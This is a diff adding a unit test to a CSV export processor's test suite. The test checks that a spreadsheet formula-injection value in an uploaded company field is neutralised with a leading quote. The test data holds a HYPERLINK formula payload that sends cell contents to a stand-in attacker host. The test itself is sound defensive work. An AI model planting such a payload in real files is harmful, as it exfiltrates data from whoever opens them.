@@ -294,6 +294,46 @@ describe("CSV Processor", () => {
       expect(result.csvContent).toContain("Canada");
       expect(result.csvContent).toContain("United Kingdom");
     });
+
+    it("neutralizes a formula-injection payload in an uploaded field instead of writing it raw", async () => {
+      // This is a webinar registrant list — nobody who exports it typed every field
+      // themselves. A company/name value starting with =, +, - or @ is read as a
+      // formula by Excel/Sheets the moment whoever exports this opens the file, not
+      // as the text it looks like here. See shared/csv.ts.
+      const { csvProcessorRouter } = await import("./csv-processor-router");
+      const caller = csvProcessorRouter.createCaller(mockAuthContext);
+
+      const rows = [
+        {
+          email: "jane@example.com",
+          fname: "Jane",
+          lname: "Smith",
+          company: '=HYPERLINK("https://evil.example/steal?x="&A1,"Click")',
+        },
+      ];
+      const mappings = {
+        "Email": "email",
+        "First Name": "fname",
+        "Last Name": "lname",
+        "Company": "company",
+      };
+
+      const result = await caller.processData({
+        rows,
+        mappings,
+        transformations: [],
+        eventName: "2025-01-15-WBN-Test",
+        defaultStatus: "Registered",
+      });
+
+      expect(result.success).toBe(true);
+      // The raw payload, unprefixed, must not appear anywhere in the file.
+      expect(result.csvContent).not.toContain(rows[0].company);
+      // csvRow's defense: a leading single quote makes every affected spreadsheet
+      // application read the cell as text instead of evaluating it. The inner
+      // double quotes are themselves doubled by the surrounding CSV-quote escaping.
+      expect(result.csvContent).toContain('\'=HYPERLINK(""https://evil.example');
+    });
   });
 
   describe("analyzeAndMap — degraded (no LLM reachable)", () => {
